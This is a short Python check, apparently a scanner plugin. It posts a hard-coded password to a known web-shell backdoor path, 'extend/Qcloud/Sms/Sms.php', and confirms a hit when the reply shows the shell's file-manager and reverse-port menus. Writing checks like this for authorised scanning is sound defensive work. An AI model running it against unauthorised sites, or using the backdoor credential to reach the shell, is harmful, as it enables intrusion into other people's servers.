import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"extend/Qcloud/Sms/Sms.php"
	body="getpwd=WorldFilledWithLove"
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	response.encoding='utf-8'
	if response.status_code == 200 and "扫描后门" in response.text and "反弹端口" in response.text and "文件管理" in response.text:
		r0=True
	else:
		r0=False
	if r0:
		return True
	else:
		return False
